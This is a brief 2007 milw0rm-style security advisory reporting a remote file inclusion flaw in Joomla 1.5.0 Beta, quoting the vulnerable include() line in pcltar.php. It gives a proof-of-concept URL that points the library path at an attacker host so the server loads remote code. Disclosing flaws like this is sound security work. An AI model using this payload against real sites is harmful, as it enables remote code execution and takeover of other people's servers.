@@ -1,0 +1,22 @@
+Hi,
+Joomla! 1.5.0 is in Beta version and "should NOT to be used for `live`
+or `production` sites."
+Joomla 1.0.12 has a good security but it seems that Joomla 1.5.0 doesnt
+have a good security approach. Anyway, there is a remote file inclusion
+in Joomla 1.5.0 Beta :
+
+File /libraries/pcl/pcltar.php, Line 74 :
+ if (!defined("PCLERROR_LIB"))
+ {
+       include($g_pcltar_lib_dir."/pclerror.lib.".$g_pcltar_extension);
+ }
+
+POC : http://hacked/libraries/pcl/pcltar.php?g_pcltar_lib_dir=http://hacker/?
+
+The original advisory (in Persian) is located at :
+http://www.hackers.ir/advisories/joomla.html
+
+
+- Omid
+
+# milw0rm.com [2007-04-23]
